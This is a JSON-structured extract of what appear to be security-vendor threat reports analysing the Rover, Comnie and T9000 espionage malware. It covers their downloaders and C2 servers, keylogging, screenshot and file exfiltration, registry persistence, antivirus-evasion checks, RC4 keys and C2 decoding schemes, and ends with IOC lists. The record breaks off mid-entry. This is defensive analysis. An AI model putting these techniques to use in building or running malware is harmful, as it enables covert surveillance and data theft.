        {
            "type": "paragraph",
            "content": [
                "Figure 4: Debug information of downloader program"
            ]
        },
        {
            "type": "caption",
            "content": [
                "By analyzing file.exe, we can see that it is a downloader, which creates \u2018c:\\system\u2019 directory and depending on the OS version used, downloads the main Rover payload along with multiple DLL modules from 46.166.165.254."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5: Code snippet showing the OS version check and the subsequent download from 46.166.165.254"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the infected system is running an OS version prior to Windows Vista, it would download the following files from 46.166.165.254:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the OS version is Windows Vista or later, it would download the following files from 46.166.165.254 :"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After retrieving these files, the downloader Trojan executes the main module.",
                "Even though the main modules use different library versions, the functionality of the backdoors are identical."
            ]
        },
        {
            "type": "caption",
            "content": [
                "By analyzing the files downloaded to the victim machine, we can see that the executable WindowsSecurityService2.exe imports the four DLL files that were downloaded to the same directory.",
                "The four DDLs are cxcore210.dll, highgui210.dll, OpenAL32.dll and libsndfile-1.dll as shown in Figure 6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6: Executable and DLLs downloaded to the victim machine"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attributes of the Rover variant"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "##############################################"
            ]
        },
        {
            "type": "caption",
            "content": [
                "File: WindowsSecurityService2.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "##############################################"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Meta-data"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "==============================================="
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Size : 337920 bytes\nType : PE32 executable (console) Intel 80386, for MS Windows\nArchitecture : 32 Bits binary\nMD5 : 76429f8515768f9f5def697e71071f51\nSHA1 : d04ce934561934f758d77dfa944bd6743dd82cff\nSHA256: 7757517ae6b4d513a57826f9ab65bd070d99d25ac526cfae3e9955c3c7cd457assdeep : 6144:JabBRNUKgZ9SN0jzoFBB9hcrpXwg9xXYOGl93XO2rQLfbTpLuO7bIWjRO5gjPNq:JarSKu6yzoF8rpAqXYv3XOgQLfnpLuOu\nimphash : b5aa366f452feb9f4dff3c72157ca1f9\nDate : 0x5637227B",
                "[Mon Nov 2 08:44:43 2015 UTC]\nLanguage : ENGLISH\nCRC: (Claimed) : 0x59736, (Actual): 0x59736\nEntry Point :",
                "0x43e3c8 .text 0/5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "==============================================="
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Imports"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "==============================================="
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "1] ADVAPI32.dll\n[2] WS2_32.dll\n[3] WLDAP32.dll\n[4",
                "] cxcore210.dll (OpenCV module)\n[5",
                "] highgui210.dll (OpenCV module)\n[6] OpenAL32.dll\n[7] libsndfile-1.dll\n[8] GDI32.dll\n[9] KERNEL32.dll\n[10] USER32.dll\n[11] MSVCP90.dll\n[12] RPCRT4.dll\n[13] MSVCR90.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The author of 'Rover' used the following open source projects to implement the main functionalities of this custom malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "OpenCV  Taking photos from the web cam\nOpenAL  Recording Audio\nLibsndfile  C library used for reading and writing audio files\nLibCurl  For all network communications"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both versions of Rover use OpenCV and OpenAL for some of the main functions."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "OpenCV is a library of functions written primarily for building real time computer vision applications, image processing and also machine learning.",
                "It has seen wide acceptance in security systems, medical image analysis, unmanned vehicles, visual surveillance, object tracking, Artificial Intelligence and many other applications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "OpenAL is a cross-platform audio API for rendering multichannel three-dimensional positional audio (i.e., It is a means to generate audio in a three-dimensional space.)",
                "Earlier versions of OpenAL were opensource but later versions (since v1.1) have been proprietary."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once executed, Rover creates following registry entry to execute itself when the computer reboots."
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"System",
                "Application\" = c:\\system\\WindowsSecurityService[2 or 3].exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware then creates six threads, each with a different job:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7: Threads created by the malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1. Heartbeat:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sends heartbeat signal on HTTP to the C2 server at 46.166.165.254 every five seconds and checks whether the C2 server is running."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2. ScreenShot:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This saves screenshots as c:\\system\\screenshot.bmp and sends it to the C2 server at 46.166.165.254 every 60 minutes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8: Screenshots sent to C2 server at 46.166.165.254"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3. Finding specific file types on Removable Drive:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "This thread searches for for files with the following extensions on removable drives and copies them to \u2018c:\\system\u2019 every 5 seconds."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4. Keylogger:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "This logs key strokes at \u2018c:\\system\\log.txt\u2019 and sends captured data to the C2 every 10 seconds"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5.",
                "Stealing specific file types from Hard Drive:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This thread searches for for files with the following extensions on fixed drives and sends them to C2 every 60 minutes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9: Document file being sent to C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6.",
                "Backdoor:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This thread obtains backdoor commands from C2 every 10 seconds and executes them.",
                "Backdoor commands are listed below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Though 'Rover' is unsophisticated and lacks many modern features common to advanced malware, detection rate of the 'Rover' is extremely low.",
                "At the time of this writing, two out of three samples on VirusTotal were not detected by any Antivirus product"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 10: No detection by any AV product on Virustotal"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 11: Low detection rate"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "OpenCV has been extensively used by organizations, government bodies, and research groups for real time capture, image manipulation, object detection and many other uses in new forms of Human-Computer interaction, security systems, driver-less cars among many others.",
                "OpenCV was also used by the Mars Rovers to send captured data back to Earth."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It is interesting to see the very code used in such significant projects also being used to track and spy on individuals being targeted and which can remain undetected by traditional security systems.",
                "Though 'Rover' is an unsophisticated malware lacking modern malware features, it seems to be successful in bypassing traditional security systems and fulfilling the objectives of the threat actor behind the campaign in exfiltrating information from the targeted victim.",
                "It is important to understand the techniques and tools being used by such threat actors to better defend and protect organizations from such threats."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks AutoFocus users can identify this threat using the Rover tag."
            ]
        },
        {
            "type": "caption",
            "content": [
                "C2:\n46.166.165.254"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Downloader hosting links:\nnewsumbrella[.]net/ne3s/lat3st/w0rld/systemupdateAPI[.]exe\nnewsumbrella[.]net/ne3s/file[.]exe\nnewsumbrella[.]net/bla3k/extra7/systemupdateAPI[.]exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://en.wikipedia.org/wiki/Afghanistan%E2%80%93India_relations\nhttp://docs.opencv.org/3.1.0/#gsc.tab=0\nhttp://docs.opencv.org/2.4/modules/highgui/doc/highgui.html\nhttps://en.wikipedia.org/wiki/OpenAL\nhttp://www.cs.uml.edu/~holly/teaching/91450/spring2013/bschroeder_vision_robotics1.pdf\nhttps://ti.arc.nasa.gov/m/pub-archive/422h/0422%20(Pedersen).pdf"
            ]
        }
    ],
    "5c7516d2a6aa566b01e9dc8412a485910d00a6c0": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 has been tracking a series of attacks using a remote backdoor malware family named Comnie, which have been observed targeting organizations in the East Asia region.",
                "Comnie, first named by Sophos seemingly after the Windows LNK file name it created, is a custom malware family that is used in targeted attacks, and has been observed in the wild since at least April 2013.",
                "The Comnie malware family is notable in that it leverages online blogs and third-party services to obtain command and control (C2) information.",
                "Recent instances of the malware have been observed leveraging github.com, tumbler.com, and blogspot.com.",
                "Attackers using Comnie are leveraging malicious macros that initially hide decoy documents and shows them when the victim enables macros.",
                "These decoys documents pertain to various subject matters that the targets would be likely to be interested in.",
                "The contents of these documents suggest that the main interests of threat actor likely included the organizations in the following industries, located in Taiwan:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The most recent attacks, in November 2017, likely targeted organizations in the following industries, located in South Korea:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, while researching this campaign, we identified historical attacks that appear to target the Taiwan government, an IT service vendor based in Asia, and a journalist of a Tibetan radio station.",
                "Activities Involving Comnie\nBeginning in mid of 2015, we observed the Comnie malware family delivered via malicious macros with various file names and decoy subject matters.",
                "Original file names, as well as information revealed within the decoy documents used by these samples provide clues as to who the targets may be.",
                "In the most recent attacks in November 2017, the information suggests that these attacks have most likely taken place against Aerospace and Defense industry targets in South Korea."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following decoy contents are only shown to the victim after macros have been enabled:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Decoy document discussing an airport contact list in Korean"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Decoy document discussing Performance Based Communication and Surveillance (PBCS)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Before the attacks against South Korean targets, the same malicious macros were used to deliver the Comnie malware family to targets in Taiwan as early as 2015.",
                "Again, based on the original file names and the decoy contents, the most commonly witnessed targets in attacks that occurred in 2017 included those involving the Telecommunication, Defense, and High-Tech industries in Taiwan."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Decoy document discussing Taiwan\u2019s defense industry development strategy"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Network firewall configuration description for a telecommunication company in Taiwan"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Decoy document providing network topology information"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It is worth noting that in the attack that made use of the decoy document in Figure 4, the attacker also included related firewall logs and appears to have originated from a compromised an IT service vendor.",
                "Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Email sent to Journalist of Tibetan radio station"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malicious Macros\nThe malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document.",
                "Once the user enables macros, the macro will perform the following actions:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Example macro used to delivery Comnie"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "An interesting discovery was made when examining the macros used to deliver Comnie.",
                "Based on evidence gleaned from both the macro and other data collected from the samples, it appears that the threat actor did not generate these documents from scratch.",
                "Instead, they appear to have been created based on an existing sample available via public sample repositories.",
                "The existing sample in question was created by a red team penetration tester at a financial institution for internal testing.",
                "The following image shows a comparison of macro code extracted from Comnie dropper and financial institutions penetration test sample."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 Comparison of macros extracted from Comnie dropper versus a pentest sample used by a financial organization"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Comnie Malware Family\nComnie uses the RC4 algorithm in multiple locations both to obfuscate strings used by the malware, as well as for network communication.",
                "Additionally, the malware looks for multiple security products on victim machines and sometimes alters its behavior depending on the products present.",
                "More information about how Comnie handles identified security products may be found in the technical analysis in the Appendix.",
                "These security products included those that are known to be most widely used within South Korea and Taiwan.",
                "Comnie is able to achieve persistence via a .lnk file that is stored within the victims startup path.",
                "When originally run, Comnie will convert itself from an executable file to a DLL and will write this newly created DLL to the host machines %APPDATA% directory.",
                "The built-in Windows utility rundll32.exe is then used to load this DLL by the original .lnk file.\nUnit 42 has observed a total of two variants of Comnie.",
                "One of the ways the variants differ is in how they obtain their command and control (C2) information.",
                "Both variants make use of third-party online services in an attempt to prevent DNS based blocking of their first stage communications.",
                "However, the obfuscation mechanism varies slightly.",
                "In older variants, Comnie was found to look for the ++a++ markers.",
                "The example C2s used by older variants of Comnie demonstrates this:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9 Old Comnie variants collecting C2 information"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants.",
                "Newer Comnie variants, such as the ones witnessed in the most recent attacks, instead look for the magnet:/ and ?",
                "markers, such as in the following recent example:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10 New Comnie variants determining their C2 information via a GitHub profile."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests.",
                "These requests are encrypted using the RC4 algorithm.",
                "Comnie will upload information about the victim.",
                "It also allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL).",
                "More detailed information about how C2 information is decoded and additional technical analysis of Comnie may be found in the Appendix.\n\nConclusion\nComnie is far from a new threat, however, it continues to remain active.",
                "In the past year, we have observed multiple low volume attacks in various regions of East Asia.",
                "Based on clues provided by the malwares original file names, as well as the decoy content embedded within these samples, we can make a reasonable estimation that these attacks targeted organizations in Taiwan in the Telecommunication, Defense, Government, and High-Tech industries.",
                "Additionally, those same estimations may be made for attacks in South Korea targeting the Aerospace and Defense industries.",
                "While we have witnessed modifications to the attackers toolsets, the overall architecture and operations of the Comnie malware family have remained consistent, suggesting that the attackers have been able to stay below the radar of the security community.",
                "The Comnie malware family is notable in that it leverages third-party online services to download and parse C2 information.",
                "Because these third-party online services are legitimate, it allows Comnie to circumvent a number of security preventions that may be present in the environment.",
                "This overall technique has previously been referred to as using a Dead Drop Resolver or DDR.",
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, blogspot, tumblr, and github have been alerted to the malicious activity discovered."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Comnie Technical Analysis\nFor the analysis of the Comnie malware family, we investigated the following sample:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the sample is initially executed, it will attempt to create a mutex with a name of tmutexabc to ensure only a single instance of Comnie is running at a given time.",
                "Should this mutex already be found to exist, the malware will immediately exit.",
                "Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 11 Embedded BMP file containing encrypted string data"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "RC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502.",
                "Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 12 Decrypted strings from embedded BMP file"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on.",
                "After these functions are loaded, Comnie determines if it is running within the %TEMP% directory of the victim machine.",
                "In the event it is not running within this directory, it will copy itself to %TEMP% and execute this newly created file with an argument of the original files path.",
                "A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk.",
                "After running within the %TEMP% path, Comnie will delete the original file.",
                "After Comnie has been copied to the %TEMP% directory, it will look for the presence of the DQuit.tmp file in this path.",
                "It is unclear how this file is used exactly, as it does not appear to ever be written during runtime by Comnie.",
                "Comnie continue to enter its installation routine.",
                "In doing so, it will attempt to detect the following Anti-",
                "Virus products via various techniques:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ahnlab and ALYac are the most widely used Anti-",
                "Virus solutions in South Korea, and Trend Micro and the rest are also known to be most widely used in Taiwan.",
                "These are in-line with the targeting of the victims witnessed by the attackers using Conmie.",
                "With a few exceptions, Comnie will perform the following actions regardless of what security product, if any, is discovered:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One of the exceptions to the installation routine above is in the event Symantec is detected.",
                "In such a scenario, Comnie will drop a temporary VBS script to write the Conime.lnk file.",
                "Additionally, in the event Kaspersky is detected, the malware will immediately run the Conime.lnk shortcut file in a new process after it is created.",
                "After the installation routine, the malware will decrypt an embedded blob of data using RC4 with an embedded 8-byte static key of \\x11\\xcc\\xd1\\x32\\x61\\x21\\xd1\\xe2.",
                "The results of the decoded data may be seen below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 13 Decrypted information"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decrypted data contains URLs for various online services that will be used by the attacker for downloading data that will contain the command and control (C2) server(s) and port(s) to be used by Comnie.",
                "Comnie will make requests to these URLs, looking for base64-encoded data after an identifier of magnet:/, as seen in the example below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 14 GitHub storing Comnie C2 information"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the example above, the C2 information is being stored within the users URL parameter within GitHub.",
                "In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse):\n/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA\n\nThe resulting data is then parsed and decrypted using RC4.",
                "The first 64 bytes are used as the key.",
                "The next 4 bytes represent the underlying datas length, and the remaining data is the C2 data.",
                "The prior example decrypts to the following:\nmailto:121.126.211[.]94:8080;80;80\n\nThe following Python script may be used to decode the C2 data used by the newest Comnie variant:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Comnie will make attempts at connecting to the IP address above using the various ports specified.",
                "Data is sent via HTTP, and is encrypted against using the RC4 algorithm.",
                "The URIs used in the HTTP requests are randomly generated.",
                "Data is provided first via the pid GET parameter initially, and via the iid GET parameter when POST requests are made by Comnie.",
                "Initially, Comnie will send the following request:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 15 Comnie initial beacon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order to decrypt the data provided within the pid parameter, a key is generated using the SessionID information, which is randomly generated.",
                "This particular data is decoded from hex and bytes at offsets 0, 2, 4, 6, 8, 10, 12, and 14 are used to form an 8-byte RC4 key.",
                "After applying this decryption algorithm, we are presented with the following data:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "h=HOSTNAME-PC&f=mission.ini&c=&"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The response made by the C2 server uses the same RC4 key for encryption.",
                "The data above contains the hostname (HOSTNAME-PC) of the victim machine, as well as an instruction.",
                "In this case, the instruction is asking for information that is to be written to a temporary BAT file within the %TEMP% directory.",
                "The following example information is provided by the remote C2 server:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This INI file is parsed to determine what Comnie should do.",
                "Comnie allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL).",
                "Using this example, Comnie will then request data to supply to the BAT script, via the following decrypted request:\nh=HOSTNAME-PC&f=gethostinfo.bat&c=&\nBased on network traffic witnessed, the remote C2 server was found to respond with the following information:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This script is written to a temporary file prior to be executed.",
                "The results of this BAT script are uploaded to the remote C2 server.\n\nOld Comnie Variant C2 Decoder"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Samples Analyzed\need5945c36ba22a2531dd2d9dd7bc4e17e68544d512be75670919caf287c1b4a\n8026442b812469e48ccd11611ab6eacdcb312a8f1aabd563b7f4cb4868315e16\nc8951038fd53321661274e5a12532c3fb6f73c75fd75503a1089c56990658fef\n48a1ce103e5bf47c47cc5ed40b2dc687ebaf3674d667419287bcb1d0b8d8dda6\ne06b797a24fa03a77e0d5f11b0cf0f4f038e0a9ea04d4981d39148969349c79c\n7282d0709449abe16457864f58157cac8d007571dc5d463d393d1ae2605d17e0\nbf6ee8426245b167a69292e513c0841d818b310dda87daea649221f4e0afd1b3\n62b98dde60cb4dd0d0088bde222c5c2c4c92560cccf4753f1ce94e044093ab85\n756952652290ad09fe03c8674d44eab2077b091398187c3abcb6f1ddc462c32d\n639a49390c6f8597d36ec0bd245efa1b4a078c0506fb515e577a40389b39a614\n29ed6eb3c882b018c2bb6bf2f8eb15069dc5510ca119abebf24f09e3c91f10aa\n0e8a4e4d5ca501bad25a730fb5de534fa324c6ac23e0a573524693f2d996d105\n316a0c6849f183a1a52d0c7648e722c4ca85bd57b0804a147c0c8656b84bbdb9\n\nIdentified C2s\n121.126.211[.]94:8080\n113.196.70[.]11:80,8080\n133.130.101[.]47:443\n123.51.208[.]157:443;8000;8080\n\nC2 Hosting URLs (DDR URLs)\ngithub[.]com/korlee5643\nitsmonsee.tumblr[.]com\nallworldnewsway.blogspot[.]com"
            ]
        }
    ],
    "4c9fbda4ee97d98875dd605a5f1b8cb5da6b5fbd": [
        {
            "type": "paragraph",
            "content": [
                "Most custom backdoors used by advanced attackers have limited functionality.",
                "They evade detection by keeping their code simple and flying under the radar.",
                "But during a recent investigation we found a backdoor that takes a very different approach.",
                "We refer to this backdoor as T9000, which is a newer variant of the T5000 malware family, also known as Plat1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to the basic functionality all backdoors provide, T9000 allows the attacker to capture encrypted data, take screenshots of specific applications and specifically target Skype users.",
                "The malware goes to great lengths to identify a total of 24 potential security products that may be running on a system and customizes its installation mechanism to specifically evade those that are installed.",
                "It uses a multi-stage installation process with specific checks at each point to identify if it is undergoing analysis by a security researcher."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The primary functionality of this tool is to gather information about the victim.",
                "In fact, the author chose to store critical files dropped by the Trojan in a directory named Intel.",
                "T9000 is pre-configured to automatically capture data about the infected system and steal files of specific types stored on removable media."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have observed T9000 used in multiple targeted attacks against organizations based in the United States.",
                "However, the malwares functionality indicates that the tool is intended for use against a broad range of users.",
                "In this report, we share an analysis of each stage in T9000s execution flow.",
                "Stay tuned for a future report in which we will provide more detail on how this tool has been used and the infrastructure we have identified as part of our analysis."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The entire execution flow of the malware is represented in the following diagram:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As this malware uses a multistage execution flow, well discuss each stage individually."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample of T9000 used in this analysis was originally dropped via a RTF file that contained exploits for both CVE-2012-1856 and CVE-2015-1641.",
                "When triggered, an initial shellcode stage is run, which is responsible for locating and executing a secondary shellcode stub.",
                "The second stage shellcode reads the initial RTF document and seeks to the end of the file, using the last four bytes as the size of the embedded payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the payload size confirmed, the shellcode will create a file in the %TEMP% folder using a temporary filename.",
                "The shellcode will decrypt and subsequently load the embedded payload in the RTF file.",
                "The decrypted payload is written to the temporary file and executed using WinExec.",
                "The shellcode then attempts to decrypt an embedded decoy document with the same algorithm used to decrypt the payload, which it will save to %TEMP%\\~tmp.doc path.",
                "This file is opened using the following command:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "cmd /C %TEMP%\\~tmp.doc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, this particular sample did not contain a decoy document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When this temporary file is initially executed, it will begin by creating the following mutex to ensure only one instance of the malware is running at a given time:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "820C90CxxA1B084495866C6D95B2595xx1C3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It continues to perform a number of checks for installed security products on the victim machine.",
                "The following security platforms are queried by checking entries within the HKLM\\Software\\ registry path:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These security products are represented by a value that is binary AND-ed with any other products found.",
                "The following numbers represent each respective security product."
            ]
        },
        {
            "type": "caption",
            "content": [
                "0x08000000",
                ":",
                "Sophos\n0x02000000 : INCAInternet\n0x04000000 : DoctorWeb",
                "0x00200000 : Baidu\n0x00100000 :",
                "Comodo\n0x00080000 : TrustPortAntivirus\n0x00040000 : GData\n0x00020000 : AVG\n0x00010000 : BitDefender\n0x00008000 : VirusChaser\n0x00002000 : McAfee\n0x00001000 : Panda\n0x00000800 : Trend Micro\n0x00000400 : Kingsoft\n0x00000200 : Norton\n0x00000100 : Micropoint\n0x00000080 : Filseclab\n0x00000040 : AhnLab\n0x00000020 : JiangMin",
                "0x00000010 : Tencent\n0x00000004 :",
                "Avira\n0x00000008 : Kaspersky\n0x00000002 : Rising\n0x00000001 :",
                "360"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "So, for example, if both Trend Micro and Sophos were discovered on a victim machine, the resulting value would be 0x08000800.",
                "This numerical value is written to the following file:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%APPDATA%\\Intel\\avinfo"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware proceeds to drop the following files to the %APPDATA%\\Intel directory:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the following two files are written to the Data directory:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following table provides a description of each file dropped:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Youll notice that QQMgr* files are not listed in the original malware execution flow diagram.",
                "In the event the victim is running any of the following operating system versions, as well as either Kingsoft, Filseclab, or Tencent security products, the malware will be installed using an alternative method."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In such a situation, the malware will find and run the built-in Microsoft Windows InfDefaultInstall.exe program, which will install a DLL via an INF file.",
                "Should Tencent be installed, the malware will execute the InfDefaultInstall.exe program with an argument of QQMgr.inf.",
                "Otherwise, it will use hccutils.inf as an argument."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "QQMgr.inf will install the QQMgr.dll, while hccutils.inf will install the hccutils.dll library.",
                "QQMgr.dll will set the following registry key:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Eupdate - %APPDATA%\\Intel\\ResN32.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The QQMgr.dll file has the following debug string found within it:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "H:\\WORK\\PROJECT\\InfInstallBypassUAC\\Release\\BypassUAC.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The hccutils.dll file is described later within this post."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the malware drops the required files, by default the malware will spawn %APPDATA%\\Intel\\igfxtray.exe in a new process, which begins the second stage of the malwares execution."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The igfxtray.exe is a legitimate Microsoft Windows executable that sideloads the malicious hccutils.dll DLL file.",
                "This DLL has the following debug string embedded within it:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "D:\\WORK\\T9000\\hccutils_M4\\Release\\hccutils.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon loading this malicious DLL, the malware will initially perform the same queries for security products that were witnessed in stage 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Three separate techniques for starting stage 3 are used depending on the properties of the victim."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The first technique is used if the victim meets the following criteria:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For this situation, the following registry key is set:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\update - %SYSTEM%\\rundll32.exe %APPDATA\\Intel\\ResN32.dll Run"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This ensures that the ResN32.dll library will be run using the Run exported function whenever the machine is rebooted."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The second technique is used if the victim meets any of the following sets of criteria:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In these situations, the following persistence technique is used."
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs - %APPDATA%\\Intel\\ResN32.dll"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs \u2013 0x1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Setting these registry keys both enables the AppInit_DLL functionality, and ensures that every user mode process that is spawned will load the ResN32.dll library.",
                "More information about this can be found here."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The third technique is used in any other situation.",
                "When this occurs, the malware will first identify the explorer.exe process identifier.",
                "It proceeds to inject the ResN32.dll library into this process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At this point, the third stage of the malware family is loaded."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The third stage begins when the ResN32.dll file begins operating.",
                "This file contains the following debug string:"
            ]
        },
        {
            "type": "caption",
            "content": [
